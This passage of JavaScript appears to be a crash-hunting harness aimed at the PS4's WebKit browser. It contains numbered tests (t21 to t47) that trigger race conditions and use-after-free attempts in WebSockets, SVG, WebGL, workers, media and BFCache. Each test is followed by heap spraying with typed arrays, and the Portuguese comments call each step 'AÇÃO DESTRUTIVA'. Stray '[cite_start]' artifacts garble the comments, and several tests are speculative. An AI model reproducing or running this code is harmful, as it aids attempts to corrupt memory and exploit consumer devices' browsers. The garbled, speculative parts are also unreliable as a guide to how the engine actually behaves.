            cap.dispatchEvent(ev);
            // Clica também por garantia
            cap.click();
        }, 500);
    }
// =================================================================
    // 21. WebSocket Binary Race
    // Evento: onmessage (Recebendo ArrayBuffer)
    // API: close() + GC Pressure
    // Lógica: WebSockets no PS4 usam buffers de rede do kernel. 
    // Fechar o socket *durante* o recebimento de um pacote binário grande
    // e forçar alocação de memória pode causar corrupção no buffer de rede.
    // =================================================================
    function t21() {
        const ws = new WebSocket("wss://echo.websocket.org");
        ws.binaryType = "arraybuffer";

        ws.onopen = () => {
            // Envia blob grande para receber de volta (Echo)
            const buf = new Uint8Array(1024 * 1024 * 5); // 5MB
            ws.send(buf);
            log.innerText = "Payload sent...";
        };

        ws.onmessage = (e) => {
            try {
                // AÇÃO DESTRUTIVA
                // O kernel está copiando dados para o 'e.data' (ArrayBuffer)
                // Fechamos o socket violentamente agora.
                ws.close();
                
                // Sobrescreve a memória heap imediatamente
                spray.push(new Float64Array(100000));
                
                log.innerText = "Socket closed during binary receive";
            } catch(err) {}
        };
    }

    // =================================================================
    // 22. Pointer Capture UAF
    // Evento: onpointerdown
    // API: setPointerCapture / target.remove()
    // Lógica: 'Pointer Capture' força todos os eventos de input para um elemento.
    // Se esse elemento for removido enquanto tem a captura, o subsistema de entrada
    // (libScePad) pode tentar enviar coordenadas para um objeto nulo.
    // =================================================================
    function t22() {
        const d = document.createElement('div');
        d.innerText = "POINTER TARGET";
        d.style.background = "red";
        d.style.padding = "50px";
        stage.appendChild(d);

        d.onpointerdown = (e) => {
            try {
                d.setPointerCapture(e.pointerId);
                
                // AÇÃO DESTRUTIVA
                // O elemento capturou o ponteiro, mas agora deixa de existir
                d.remove();
                
                // Força atualização de layout
                document.body.offsetWidth;
                
                log.innerText = "Element removed while holding pointer capture";
                spray.push(new Uint32Array(5000));
            } catch(err) {}
        };

        // Simula clique do ponteiro
        setTimeout(() => {
            d.dispatchEvent(new PointerEvent("pointerdown", { pointerId: 1 }));
        }, 500);
    }

    // =================================================================
    // 23. History State Flood (Kernel OOM)
    // Evento: onpopstate
    // API: history.pushState (Recursivo)
    // Lógica: Cada entrada no histórico consome memória do sistema para salvar o estado.
    // Um loop infinito de pushState dentro de popstate cria uma explosão exponencial
    // de alocação que o Garbage Collector não consegue acompanhar.
    // =================================================================
    function t23() {
        let count = 0;
        
        // Inicia o estado
        history.pushState({id: 0}, "init");

        window.onpopstate = () => {
            if(count++ > 10000) return;
            
            try {
                // AÇÃO DESTRUTIVA
                // Injeta estados gigantes rapidamente
                const junk = new Array(1000).join("X");
                history.pushState({junk: junk}, "flood " + count);
                
                // Força navegação para disparar novo popstate
                history.back();
                
                log.innerText = "History Flood: " + count;
            } catch(e) {}
        };

        // Gatilho inicial
        setTimeout(() => history.back(), 100);
    }

    // =================================================================
    // 24. SVG Path Segment Fault
    // Evento: Loop de Animação
    // API: createSVGPathSegClosePath (API Legada/Obscura)
    // Lógica: O WebKit mantém APIs antigas de SVG para compatibilidade.
    // Manipular segmentos de caminho (PathSeg) manualmente em um elemento que
    // está sendo removido é um vetor de ataque raro mas eficaz.
    // =================================================================
    function t24() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path.setAttribute("d", "M0 0 L10 10");
        svg.appendChild(path);
        stage.appendChild(svg);

        const loop = setInterval(() => {
            try {
                // Cria um segmento de fechamento de caminho (ClosePath)
                // Nota: createSVGPathSegClosePath pode não existir em WebKits muito novos,
                // mas no PS4 (v12.xx e anteriores) é provável que exista ou tenha polyfill interno.
                if(path.createSVGPathSegClosePath) {
                    const seg = path.createSVGPathSegClosePath();
                    path.pathSegList.appendItem(seg);
                } else {
                    // Fallback para manipulação de string se a API for removida
                    path.setAttribute("d", path.getAttribute("d") + " z");
                }

                // AÇÃO DESTRUTIVA
                path.remove();
                stage.appendChild(path); // Reanexa para stress

                spray.push(new Uint8Array(100));
            } catch(e) { clearInterval(loop); }
        }, 5);
        
        log.innerText = "SVG Path Segment mutation race";
    }

    // =================================================================
    // 25. Stylesheet Insertion Race
    // Evento: onresize
    // API: insertRule + disabled
    // Lógica: Inserir regras CSS força o recálculo da árvore de renderização (RenderTree).
    // Desabilitar a folha de estilo imediatamente após inserir uma regra cria
    // uma condição onde o renderizador tenta aplicar uma regra que foi invalidada.
    // =================================================================
    function t25() {
        const style = document.createElement('style');
        document.head.appendChild(style);
        const sheet = style.sheet;

        // Usa resize como gatilho de layout
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        ifr.contentWindow.onresize = () => {
            try {
                // 1. Injeta regra complexa
                sheet.insertRule("body { background: linear-gradient(red, blue); }", 0);
                
                // 2. AÇÃO DESTRUTIVA
                // Desabilita a folha no mesmo "tick" de processamento
                style.disabled = true;
                
                // 3. Reabilita para o próximo ciclo (Stress)
                setTimeout(() => { style.disabled = false; }, 0);
                
                log.innerText = "StyleSheet disabled during recalc";
            } catch(e) {}
        };

        // Modifica tamanho do iframe para disparar
        let w = 100;
        setInterval(() => {
            ifr.style.width = (w++) % 200 + "px";
        }, 10);
    }
// =================================================================
    // 26. Audio Thread Desync
    [cite_start]// Evento: onemptied (Buffer de mídia esvaziou) [cite: 2]
    // API: ScriptProcessorNode (Processamento de áudio em JS)
    // Lógica: O PS4 usa o módulo libSceAudioOut. O 'ScriptProcessor' roda código JS
    // dentro da thread de áudio. Se o buffer esvaziar ('onemptied') e nós
    // desconectarmos o nó enquanto o JS de áudio roda, causamos pânico no DSP.
    // =================================================================
    function t26() {
        const audio = document.createElement('audio');
        audio.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4"; // Dummy src
        stage.appendChild(audio);

        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        // Cria um processador de script (Legacy API presente no PS4)
        const processor = ctx.createScriptProcessor(4096, 1, 1);
        
        processor.onaudioprocess = function(e) {
            // Loop pesado na thread de áudio
            for(let i=0; i<1000; i++) Math.random();
        };

        audio.onemptied = () => {
            try {
                // AÇÃO DESTRUTIVA
                processor.disconnect();
                ctx.close();
                audio.remove();
                
                log.innerText = "Audio thread severed during buffer underrun";
                spray.push(new Float32Array(10000));
            } catch(e) {}
        };

        // Trigger: Tenta conectar e carregar
        processor.connect(ctx.destination);
        setTimeout(() => audio.load(), 100);
    }

    // =================================================================
    // 27. IndexedDB File Lock Race
    [cite_start]// Evento: onmessage (Worker) [cite: 1]
    [cite_start]// API: deleteDatabase [cite: 4]
    // Lógica: O sistema de arquivos do PS4 é lento. Um Worker tenta abrir o banco.
    // A thread principal tenta deletar o arquivo do banco no exato momento
    // que o Worker reporta que está "tentando abrir". Conflito de I/O no Kernel.
    // =================================================================
    function t27() {
        const dbName = "RaceDB_" + Math.random();
        
        // Código do Worker: Tenta abrir e travar o banco
        const blob = new Blob([`
            onmessage = function(e) {
                const req = indexedDB.open(e.data, 1);
                req.onsuccess = () => postMessage("OPEN");
                req.onerror = () => postMessage("ERROR");
            }
        `], {type: 'application/javascript'});
        
        const worker = new Worker(URL.createObjectURL(blob));

        worker.onmessage = (e) => {
            if(e.data === "OPEN") {
                // O banco está aberto e travado pelo Worker
                // AÇÃO DESTRUTIVA: Tenta deletar o arquivo travado
                const delReq = indexedDB.deleteDatabase(dbName);
                
                delReq.onblocked = () => {
                    log.innerText = "DB Delete Blocked (Race Condition Active)";
                    // Tenta matar o worker para soltar o lock de forma impura
                    worker.terminate();
                };
                
                spray.push(new ArrayBuffer(1024*1024));
            }
        };

        // Inicia
        worker.postMessage(dbName);
    }

    // =================================================================
    // 28. Cross-Iframe Drag UAF
    [cite_start]// Evento: ondragenter (Entrada de ponteiro) [cite: 2]
    [cite_start]// API: detach (Simulado via remove iframe) [cite: 5]
    // Lógica: Iniciamos um drag dentro de um iframe e arrastamos para o pai.
    // Quando o evento 'ondragenter' dispara no pai, destruímos o iframe de origem.
    // O 'DragSource' deixa de existir, mas o OS ainda está arrastando.
    // =================================================================
    function t28() {
        const ifr = document.createElement('iframe');
        ifr.style.width = "100%"; ifr.style.height = "100px";
        stage.appendChild(ifr);

        // Cria elemento arrastável no iframe
        ifr.onload = () => {
            const doc = ifr.contentDocument;
            const item = doc.createElement('div');
            item.innerText = "ARRASTE-ME PARA FORA";
            item.draggable = true;
            item.style.background = "red";
            item.style.width = "100px"; item.style.height = "50px";
            doc.body.appendChild(item);
        };

        // Área de recepção no pai
        const dropZone = document.createElement('div');
        dropZone.innerText = "SOLTE AQUI";
        dropZone.style.height = "50px";
        dropZone.style.background = "blue";
        stage.appendChild(dropZone);

        dropZone.ondragenter = () => {
            try {
                // AÇÃO DESTRUTIVA
                // Remove o iframe de onde o drag se originou
                ifr.remove();
                
                log.innerText = "Drag source destroyed during drag operation";
                spray.push(new Uint32Array(5000));
            } catch(e) {}
        };
        
        log.innerText = "Aguardando drag manual do iframe para o azul...";
    }

    // =================================================================
    // 29. DOM Fragment Animation
    [cite_start]// Evento: onanimationstart [cite: 2]
    [cite_start]// API: adoptNode [cite: 6]
    // Lógica: Uma animação CSS começa. O renderizador aloca recursos gráficos.
    // Movemos o elemento animado para um DocumentFragment (memória isolada).
    // O navegador tenta animar um elemento que não está na árvore de renderização.
    // =================================================================
    function t29() {
        const d = document.createElement('div');
        d.style.width = "50px"; d.style.height = "50px";
        d.style.background = "green";
        // Animação CSS
        d.style.animation = "fade 2s infinite";
        
        const style = document.createElement('style');
        style.innerText = "@keyframes fade { from { opacity: 1; } to { opacity: 0; } }";
        document.head.appendChild(style);
        
        stage.appendChild(d);
        
        const fragment = document.createDocumentFragment();

        d.addEventListener("animationstart", () => {
            try {
                // AÇÃO DESTRUTIVA
                // Adota o nó para o fragmento (remove do documento ativo)
                document.adoptNode(d);
                fragment.appendChild(d);
                
                log.innerText = "Animated node moved to fragment";
                spray.push(new Float64Array(1000));
            } catch(e) {}
        });
    }

    // =================================================================
    // 30. SVG Matrix Calculation Race
    [cite_start]// Evento: onhashchange [cite: 1]
    [cite_start]// API: getScreenCTM (Matriz de Transformação Atual) [cite: 6]
    // Lógica: Navegação por hash força atualização de viewport.
    // Pedimos ao SVG para calcular sua matriz de coordenadas (CTM) em relação
    // à tela num momento em que a tela "não existe" (durante a navegação).
    // =================================================================
    function t30() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        rect.setAttribute("width", 100); rect.setAttribute("height", 100);
        svg.appendChild(rect);
        stage.appendChild(svg);

        window.onhashchange = () => {
            try {
                // Tenta calcular matemática pesada em estado instável
                // getScreenCTM força a travessia da árvore de renderização até a raiz
                for(let i=0; i<1000; i++) {
                    const m = rect.getScreenCTM();
                    // Acesso aleatório à matriz retornada para forçar leitura de memória
                    const val = m.a + m.d;
                }
                
                // Remove o SVG durante o cálculo
                svg.remove();
                
                log.innerText = "Matrix calculated during hash navigation";
                spray.push(new Uint32Array(1024));
            } catch(e) {}
        };

        // Trigger
        setTimeout(() => {
            window.location.hash = "matrix_crash_" + Math.random();
        }, 500);
    }
 // =================================================================
    // 31. Message Port Transfer Kill
    // Evento: Transferência de Porta
    [cite_start]// API: terminate [cite: 4] + postMessage
    // Lógica: MessageChannels são tubos diretos entre threads.
    // Nós transferimos uma ponta do tubo para o Worker e matamos o Worker
    // no exato momento em que ele tenta "aceitar" a porta.
    // Isso pode deixar uma porta "pendurada" no kernel do WebKit.
    // =================================================================
    function t31() {
        const channel = new MessageChannel();
        
        const blob = new Blob([`
            onmessage = function(e) {
                const port = e.data;
                port.postMessage("PING"); // Tenta usar a porta
                while(true); // Trava a thread para forçar o terminate durante execução
            }
        `], {type: 'application/javascript'});
        
        const worker = new Worker(URL.createObjectURL(blob));

        try {
            // Transfere a porta 2 para o worker
            // O 'transfer' move a propriedade da memória para a outra thread
            worker.postMessage(channel.port2, [channel.port2]);
            
            // AÇÃO DESTRUTIVA
            // Mata o worker imediatamente. A porta 2 agora pertence a um processo morto.
            worker.terminate();
            
            // Tenta usar a porta 1 (que deveria estar conectada à porta 2 morta)
            channel.port1.postMessage("Are you dead?");
            
            log.innerText = "MessagePort transferred to terminated worker";
            spray.push(new ArrayBuffer(1024*1024));
        } catch(e) {}
    }

    // =================================================================
    // 32. BFCache DOM Root Destruction
    [cite_start]// Evento: onpagehide [cite: 1] (Entrando no Cache)
    // API: document.documentElement.remove()
    // Lógica: O BFCache salva o estado total da página na RAM para navegação rápida.
    // Ao sair da página (onpagehide), nós deletamos o elemento HTML raiz (<html>).
    // Quando voltamos (history.back), o navegador tenta restaurar uma árvore DOM sem raiz.
    // =================================================================
    function t32() {
        // Estado inicial
        history.pushState({page: 1}, "p1", "#p1");

        window.onpagehide = (e) => {
            // Só executa se a página for ser persistida no cache
            if(e.persisted) {
                try {
                    // AÇÃO DESTRUTIVA SUPREMA
                    // Remove todo o documento da árvore
                    document.documentElement.remove();
                    log.innerText = "Root element removed entering BFCache";
                } catch(err) {}
            }
        };

        // Trigger: Navega e volta rapidamente
        setTimeout(() => {
            history.pushState({page: 2}, "p2", "#p2");
            setTimeout(() => {
                history.back(); // Dispara onpageshow/onpagehide
            }, 100);
        }, 500);
    }

    // =================================================================
    // 33. SMIL Animation Suicide
    // Evento: onbegin (Evento de animação SVG SMIL)
    [cite_start]// API: remove [cite: 5]
    // Lógica: SMIL (<animate>) é um sistema de animação antigo e complexo.
    // Iniciamos uma animação que altera a geometria e, no evento de início,
    // removemos o próprio SVG. O timer interno do SMIL continua tentando atualizar o nó.
    // =================================================================
    function t33() {
        stage.innerHTML = `
            <svg id="smil_svg" width="100" height="100">
                <rect width="50" height="50" fill="red">
                    <animate attributeName="x" from="0" to="100" dur="5s" begin="indefinite" id="anim_trigger" />
                </rect>
            </svg>
        `;

        const anim = document.getElementById('anim_trigger');
        const svg = document.getElementById('smil_svg');

        anim.onbegin = () => {
            try {
                // AÇÃO DESTRUTIVA
                // O SMIL engine acabou de começar a interpolar valores
                svg.remove();
                
                log.innerText = "SVG removed during SMIL animation start";
                spray.push(new Uint32Array(5000).fill(0x1337));
            } catch(e) {}
        };

        // Trigger: Inicia animação manualmente
        setTimeout(() => {
            anim.beginElement();
        }, 500);
    }

    // =================================================================
    // 34. Fetch Stream Revoke
    // Evento: Promise resolution (Network)
    // API: URL.revokeObjectURL + fetch
    // Lógica: Usamos 'fetch' para ler um Blob URL.
    // Enquanto o 'fetch' está lendo o stream de dados (chunks), revogamos a URL.
    // Isso cria uma race condition entre a leitura de rede e a liberação de memória.
    // =================================================================
    function t34() {
        const data = new Uint8Array(1024 * 1024 * 5).fill(65); // 5MB 'A'
        const blob = new Blob([data]);
        const url = URL.createObjectURL(blob);

        // Inicia leitura
        fetch(url).then(response => {
            const reader = response.body.getReader();
            
            // Lê o primeiro pedaço
            return reader.read().then(({done, value}) => {
                // AÇÃO DESTRUTIVA
                // No meio da leitura do stream...
                URL.revokeObjectURL(url);
                
                // Tenta ler o resto. O ponteiro interno do blob foi liberado.
                return reader.read(); 
            });
        }).then(() => {
            log.innerText = "Stream read after revoke";
            spray.push(new ArrayBuffer(1024*1024));
        }).catch(e => {
            log.innerText = "Crash attempt: " + e.message;
        });
    }

    // =================================================================
    // 35. WebGL Restore UAF
    [cite_start]// Evento: webglcontextrestored (Ciclo de vida GPU) [cite: 5]
    [cite_start]// API: loseContext [cite: 5] + [cite_start]remove [cite: 5]
    // Lógica: Forçamos a perda do contexto WebGL. O navegador tenta restaurá-lo.
    // No callback de restauração, removemos o Canvas. O driver tenta re-anexar
    // o buffer gráfico a um elemento DOM morto.
    // =================================================================
    function t35() {
        const c = document.createElement('canvas');
        stage.appendChild(c);
        const gl = c.getContext('webgl');
        
        // Extensão para simular crash de GPU
        const ext = gl.getExtension('WEBGL_lose_context');
        if(!ext) { log.innerText = "No WEBGL_lose_context"; return; }

        c.addEventListener('webglcontextlost', (e) => {
            e.preventDefault(); // Permite restauração
            log.innerText = "Context Lost... Restoring...";
            setTimeout(() => ext.restoreContext(), 100);
        });

        c.addEventListener('webglcontextrestored', () => {
            try {
                // AÇÃO DESTRUTIVA
                // O driver acabou de recriar a superfície. Nós a destruímos.
                c.remove();
                
                // Desenhar no contexto órfão
                gl.clearColor(1,0,0,1);
                gl.clear(gl.COLOR_BUFFER_BIT);
                
                log.innerText = "Canvas removed during context restore";
                spray.push(new Float64Array(10000));
            } catch(e) {}
        });

        // Trigger: Perder contexto
        setTimeout(() => ext.loseContext(), 500);
    }
// =================================================================
    // 36. HTML Import Race
    // Evento: onload (Link Import)
    // API: remove()
    // Lógica: 'HTML Imports' (<link rel="import">) é uma tecnologia obsoleta
    // que o WebKit do PS4 ainda pode ter. Ela carrega um documento inteiro.
    // Se removermos o link enquanto o import está sendo processado/parseado,
    // o navegador tenta registrar elementos em um documento "fantasma".
    // =================================================================
    function t36() {
        const link = document.createElement('link');
        link.rel = 'import';
        // Usa um blob para ser o "arquivo" importado
        const blob = new Blob(['<script>document.body.style.background="red";<\/script>'], {type: 'text/html'});
        link.href = URL.createObjectURL(blob);
        
        stage.appendChild(link);

        // Tenta pegar o momento exato do parse
        setTimeout(() => {
            try {
                // AÇÃO DESTRUTIVA
                // O import está lendo o Blob e executando scripts
                link.remove();
                
                // Tenta acessar o conteúdo do import morto
                const doc = link.import; 
                if(doc) doc.body.innerHTML = "DEAD";
                
                log.innerText = "Import link removed during parse";
                spray.push(new Uint32Array(5000));
            } catch(e) {}
        }, 10);
    }

    // =================================================================
    // 37. Blob Slice UAF
    // Evento: FileReader onload
    // API: Blob.slice + URL.revokeObjectURL
    // Lógica: 'slice()' cria uma *view* (janela) sobre um Blob existente, não uma cópia.
    // Se revogarmos/destruirmos o Blob pai enquanto um FileReader está lendo
    // o 'slice' filho, podemos acessar memória liberada.
    // =================================================================
    function t37() {
        // Blob Pai Gigante (10MB)
        const parentData = new Uint8Array(1024 * 1024 * 10).fill(65);
        const parentBlob = new Blob([parentData]);
        
        // Blob Filho (Slice) - Apenas uma referência de ponteiro
        const childSlice = parentBlob.slice(0, 1024 * 1024);

        const reader = new FileReader();

        reader.onloadstart = () => {
            // AÇÃO DESTRUTIVA
            // No momento que começamos a ler o filho...
            // Tentamos invalidar o pai (simbolicamente via revoke ou GC pressure)
            // Nota: JS puro não deleta Blobs explicitamente, mas podemos soltar a referência
            // e forçar pressão de memória.
            
            // Se usarmos URL.createObjectURL no pai, podemos revogar:
            const parentUrl = URL.createObjectURL(parentBlob);
            URL.revokeObjectURL(parentUrl);
            
            // Sobrescreve variável
            // parentBlob = null; (Não funciona bem dentro do escopo fechado, mas a intenção é essa)
            
            log.innerText = "Parent blob revoked reading child slice";
            spray.push(new ArrayBuffer(1024*1024*20)); // Pressão no GC
        };

        reader.readAsArrayBuffer(childSlice);
    }

    // =================================================================
    // 38. VTT Cue GC Stress
    // Evento: ontimeupdate (Vídeo tocando)
    // API: TextTrack.removeCue
    // Lógica: Legendas (Cues) são objetos pequenos criados e destruídos aos milhares.
    // Adicionar e remover Cues em alta velocidade durante a reprodução
    // estressa o Garbage Collector específico de mídia.
    // =================================================================
    function t38() {
        const v = document.createElement('video');
        v.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4";
        stage.appendChild(v);
        
        const track = v.addTextTrack("subtitles", "Stress", "en");
        track.mode = "showing";

        v.ontimeupdate = () => {
            try {
                // AÇÃO CAÓTICA
                // Adiciona 100 cues
                for(let i=0; i<100; i++) {
                    const cue = new VTTCue(v.currentTime, v.currentTime+1, "T" + i);
                    track.addCue(cue);
                }
                
                // Remove todos imediatamente (Thrashing)
                // O renderizador de vídeo pode estar tentando desenhar um desses
                while(track.cues.length > 0) {
                    track.removeCue(track.cues[0]);
                }
                
                log.innerText = "Cue Thrashing: " + v.currentTime;
            } catch(e) {}
        };
        
        v.play();
    }

    // =================================================================
    // 39. FormData Recursive Bomb
    // Evento: N/A (Execução direta)
    // API: FormData.append (Recursão)
    // Lógica: Tenta criar um objeto FormData que contém a si mesmo (referência cíclica)
    // ou profundamente aninhado, e depois enviá-lo via XHR.
    // O serializador do WebKit antigo pode entrar em loop infinito ou estourar a stack.
    // =================================================================
    function t39() {
        const fd = new FormData();
        const file = new File(["content"], "test.txt");
        
        // Enche o FormData
        for(let i=0; i<1000; i++) {
            fd.append("file"+i, file);
        }
        
        // Tenta enviar
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/dummy");
        
        try {
            // AÇÃO: Envio de estrutura massiva
            xhr.send(fd);
            
            // Modifica o FormData DEPOIS de enviar, mas ANTES do browser serializar tudo
            // Race condition na thread de rede
            setInterval(() => {
                fd.append("late_arrival", file);
            }, 0);
            
            log.innerText = "FormData modified during send";
        } catch(e) {}
    }

    // =================================================================
    // 40. RAF Frame Desync
    // Evento: requestAnimationFrame (Loop de renderização)
    // API: innerHTML (Nuke)
    // Lógica: RAF roda antes do "Paint". Se nós destruirmos o DOM dentro do RAF,
    // o navegador preparou uma lista de coisas para desenhar que não existem mais.
    // É uma tentativa de dessincronizar o pipeline de renderização.
    // =================================================================
    function t40() {
        const d = document.createElement('div');
        d.className = "anim-target"; // CSS animation target
        d.style.width = "100px"; d.style.height = "100px"; d.style.background = "blue";
        stage.appendChild(d);

        function loop() {
            // AÇÃO DESTRUTIVA
            // Limpa o palco
            stage.innerHTML = "";
            
            // Recria imediatamente
            const n = document.createElement('div');
            n.style.width = Math.random() * 100 + "px";
            n.style.height = "100px"; n.style.background = "blue";
            stage.appendChild(n);
            
            // Tenta acessar propriedades do elemento antigo 'd' (que foi removido)
            // O navegador pode ainda ter referências pendentes para o frame atual
            const w = d.offsetWidth; 
            
            spray.push(new Uint32Array(1000));
            
            requestAnimationFrame(loop);
        }
        
        log.innerText = "RAF Desync Loop Started";
        requestAnimationFrame(loop);
    }
// =================================================================
    // 41. Isolated Document Nuke
    // API: implementation.createHTMLDocument
    // Lógica: Criamos um documento HTML inteiro na memória (invisível).
    // Começamos a manipular esse documento fantasma e forçamos um reload
    // da página principal no meio da operação. O GC pode limpar o documento errado.
    // =================================================================
    function t41() {
        // Cria um documento isolado (não está na aba atual)
        const doc = document.implementation.createHTMLDocument("Ghost");
        const div = doc.createElement("div");
        div.innerHTML = "<span>GHOST DATA</span>".repeat(1000);
        doc.body.appendChild(div);

        // Timer para manipulação
        const interval = setInterval(() => {
            try {
                // Manipulação pesada no documento fantasma
                doc.body.innerHTML += "<div>MORE DATA</div>";
                // AÇÃO CAÓTICA: Tenta "adotar" nó do fantasma para o atual
                // e recarregar a página ao mesmo tempo
                const node = document.adoptNode(doc.body.firstElementChild);
                stage.appendChild(node);
            } catch(e) {}
        }, 10);

        // AÇÃO DESTRUTIVA
        setTimeout(() => {
            clearInterval(interval);
            // location.reload() destrói o contexto global atual
            // Mas a referência 'doc' ainda está sendo manipulada no loop acima
            window.location.reload(); 
        }, 200);
        
        log.innerText = "Manipulating ghost document during reload";
    }

    // =================================================================
    // 42. Font Cache UAF
    [cite_start]// API: canvas.measureText + document.fonts.delete [cite: 6]
    // Lógica: O Canvas 2D mantém um cache de largura de texto para performance.
    // Nós medimos um texto usando uma fonte customizada e deletamos a fonte
    // imediatamente após a chamada. O cache pode apontar para uma fonte liberada.
    // =================================================================
    function t42() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const f = new FontFace('CrashFont', 'url(data:font/woff;base64,AAA...)');
        
        document.fonts.add(f);
        f.load().then(() => {
            ctx.font = "40px CrashFont";
            
            // Loop de estresse do cache de fontes
            for(let i=0; i<1000; i++) {
                // 1. O navegador calcula e cacheia a largura do glifo
                const width = ctx.measureText("TESTE DE CRASH " + i).width;
                
                // 2. AÇÃO DESTRUTIVA: Remove a fonte usada
                if(i === 500) {
                    document.fonts.delete(f);
                    // Tenta medir novamente com a fonte deletada
                    // O Canvas ainda acha que a fonte é "CrashFont"
                    ctx.fillText("UAF", 10, 10);
                }
            }
            log.innerText = "Font deleted during Canvas text measurement";
            spray.push(new Uint32Array(5000));
        });
    }

    // =================================================================
    // 43. Range Surround Violation
    [cite_start]// API: Range.surroundContents + Node.remove [cite: 5]
    // Lógica: 'surroundContents' é complexo. Ele pega um pedaço do DOM e o envolve
    // em um novo pai. Se removermos o nó pai original durante esse processo,
    // quebramos a topologia da árvore.
    // =================================================================
    function t43() {
        const d = document.createElement('div');
        d.innerHTML = "<b>PARTE 1</b><i>PARTE 2</i><u>PARTE 3</u>";
        stage.appendChild(d);

        const range = document.createRange();
        // Seleciona do meio do <b> até o meio do <u> (Seleção complexa)
        range.setStart(d.childNodes[0].firstChild, 2);
        range.setEnd(d.childNodes[2].firstChild, 2);

        const wrapper = document.createElement('span');

        try {
            // Agenda destruição para ocorrer "durante" o processamento
            // Usamos um getter com efeito colateral se possível, ou race condition simples
            Object.defineProperty(wrapper, 'appendChild', {
                value: function(node) {
                    // AÇÃO DESTRUTIVA: Quando o range tenta mover o nó para cá,
                    // nós matamos o container original 'd'
                    d.remove(); 
                    return Node.prototype.appendChild.call(this, node);
                }
            });

            // Tenta envolver o conteúdo
            range.surroundContents(wrapper);
        } catch(e) {
            log.innerText = "Topology destroyed during surroundContents";
        }
        
        spray.push(new ArrayBuffer(1024*1024));
    }

    // =================================================================
    // 44. WebGL Link Program Race
    [cite_start]// API: gl.linkProgram + gl.deleteShader [cite: 5]
    // Lógica: Linkar um programa WebGL combina Vertex e Fragment shaders.
    // É uma operação pesada no driver. Deletamos os shaders fonte enquanto
    // o driver está tentando linká-los no programa.
    // =================================================================
    function t44() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, "void main() { gl_Position = vec4(0,0,0,1); }");
        gl.compileShader(vs);
        
        const fs = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fs, "void main() { gl_FragColor = vec4(1,0,0,1); }");
        gl.compileShader(fs);

        const prog = gl.createProgram();
        gl.attachShader(prog, vs);
        gl.attachShader(prog, fs);

        // AÇÃO DESTRUTIVA
        // Manda linkar
        gl.linkProgram(prog);
        
        // Imediatamente deleta e desanexa os shaders
        // O driver pode estar lendo os shaders compilados neste momento
        gl.detachShader(prog, vs);
        gl.deleteShader(vs);
        gl.deleteShader(fs);
        
        // Tenta usar o programa (incompleto/corrompido)
        gl.useProgram(prog);
        
        log.innerText = "Shaders deleted during Program Link";
        spray.push(new Float32Array(1000));
    }

    // =================================================================
    // 45. Nested Worker Blob Kill
    // API: Worker dentro de Worker + revokeObjectURL
    // Lógica: O WebKit do PS4 pode ter dificuldades com Workers aninhados.
    // Criamos um Worker, que cria outro Worker via Blob.
    // Revogamos o Blob do Worker "neto" na thread principal.
    // =================================================================
    function t45() {
        // Código do Worker Neto
        const grandChildCode = "setInterval(() => postMessage('ALIVE'), 10);";
        
        // Código do Worker Filho (Gera o Neto)
        const childCode = `
            const blob = new Blob(["${grandChildCode}"], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            const w = new Worker(url);
            postMessage(url); // Manda a URL pro pai revogar
            w.onmessage = (e) => {};
        `;

        const childBlob = new Blob([childCode], {type: 'text/javascript'});
        const childWorker = new Worker(URL.createObjectURL(childBlob));

        childWorker.onmessage = (e) => {
            const grandChildUrl = e.data;
            
            // AÇÃO DESTRUTIVA
            // O Worker filho ainda está usando essa URL para rodar o neto.
            // Revogar aqui pode crashar o loader de script do Worker.
            URL.revokeObjectURL(grandChildUrl);
            
            // Mata o filho também para caos extra
            childWorker.terminate();
            
            log.innerText = "Nested Worker URL revoked from Main Thread";
            spray.push(new Uint8Array(1024*1024));
        };
    }
 // =================================================================
    // 46. MediaSource Buffer Race
    // Evento: sourceopen
    // API: URL.revokeObjectURL + endOfStream
    // Lógica: MSE (Media Source Extensions) permite alimentar o vídeo com bytes brutos.
    // O PS4 usa um buffer de anel no kernel para isso.
    // Revogamos a URL do blob de mídia enquanto tentamos fechar o stream ou adicionar buffer.
    // =================================================================
    function t46() {
        const ms = new MediaSource();
        const url = URL.createObjectURL(ms);
        const video = document.createElement('video');
        video.src = url;
        stage.appendChild(video);

        ms.addEventListener('sourceopen', () => {
            try {
                // AÇÃO DESTRUTIVA
                // O 'sourceopen' diz que o driver está pronto.
                // Nós revogamos a URL (liberando o identificador do recurso)
                URL.revokeObjectURL(url);
                
                // E tentamos manipular o estado do stream imediatamente
                // O ponteiro interno para o recurso de mídia pode ter sido liberado
                if (ms.readyState === 'open') {
                    ms.endOfStream();
                }
                
                // Tenta criar um buffer numa fonte "morta"
                const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                
                log.innerText = "MediaSource manipulated after revoke";
                spray.push(new Uint8Array(1024*1024));
            } catch(e) {}
        });
    }

    // =================================================================
    // 47. SVG Turbulence GPU Crash
    // Evento: Loop de Animação
    // API: removeAttribute (no filtro)
    // Lógica: O filtro <feTurbulence> é matematicamente caro e roda na GPU (libSceGnm).
    // Alteramos a frequência base (forçando recompilação do shader) e removemos
    // atributos essenciais durante o render.
    // =================================================================
    function t47() {
        stage.innerHTML = `
            <svg width="0" height="0">
                <filter id="chaos">
                    <feTurbulence type="fractalNoise" baseFrequency="0.01" numOctaves="5" />
                </filter>
            </svg>
            <div id="gpu_target" style="width:100%; height:100%; background:red; filter:url(#chaos)"></div>
        `;
        
        const filter = document.querySelector('feTurbulence');
        let i = 0.01;

        const loop = setInterval(() => {
            try {
                // Estressa a GPU mudando parâmetros
                i += 0.01;
                filter.setAttribute('baseFrequency', i);

                // AÇÃO DESTRUTIVA (Aleatória)
                if (i > 0.5) {
                    // Remove o atributo 'type' enquanto a GPU calcula o ruído
                    filter.removeAttribute('type');
                    
                    // Remove o filtro do DOM
